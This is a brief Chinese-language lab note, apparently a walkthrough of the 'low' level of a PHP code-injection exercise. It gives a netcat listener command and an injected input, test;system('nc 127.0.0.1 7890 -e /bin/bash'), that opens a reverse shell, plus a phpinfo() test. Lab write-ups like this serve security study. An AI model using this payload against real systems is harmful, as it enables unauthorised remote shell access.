# PHP code 注入

## low

可以使用nc反弹shell

先在本地使用nc监听端口 

nc -v -l 7890

随后在php输入拦输入

test;system('nc 127.0.0.1 7890 -e /bin/bash')

即可直接拿到shell

或者message=phpinfo() 可以直接看到效果
